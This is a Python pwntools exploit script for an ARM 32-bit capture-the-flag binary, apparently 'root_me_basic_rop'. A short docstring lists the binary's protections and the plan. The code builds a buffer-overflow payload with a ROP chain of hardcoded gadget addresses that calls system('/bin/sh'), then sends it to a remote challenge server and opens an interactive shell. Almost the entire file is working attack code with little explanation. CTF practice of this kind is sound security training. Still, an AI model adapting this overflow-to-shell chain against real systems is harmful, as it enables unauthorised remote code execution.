'''
    Arch:       arm-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x10000)

1. collecting gadgets
2. determine buffer length and hijack ret addr to ROP
3. ROPchain to call system(”/bin/sh”)

unintended: input 'flag' directly to get flag
ROPchain: fail to 0x8 aligning stack
'''

from pwn import *


local = 0
url, port = "node5.buuoj.cn", 28045
filename = "./root_me_basic_rop"
elf = ELF(filename)
# context(arch="aarch64", os="linux")
context(arch="arm", os="linux")

if local:
    context.log_level = "debug"
    # io = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", '-g', '6666', filename])
    io = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", filename])
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

buffer_append_len = 0x38
system_addr = 0x000104EC
pop_r3_pc_addr = 0x0001048c
pop_r0_r1_r4_r8_fp_ip_sp_pc_addr = 0x000105f0
bss_addr = 0x0002101C

def pwn():
    payload = b';' + b'/bin/sh\x00'
    payload = payload.ljust(buffer_append_len, b'f')
    payload += p32(pop_r0_r1_r4_r8_fp_ip_sp_pc_addr) + p32(bss_addr)
    payload += p32(0) * 6
    payload += p32(pop_r3_pc_addr) + p32(0) + p32(system_addr)
    
    io.sendlineafter(b'file: ', payload)
    io.sendafter(b'file: ', b'')


if __name__ == "__main__":
    pwn()
    io.interactive()
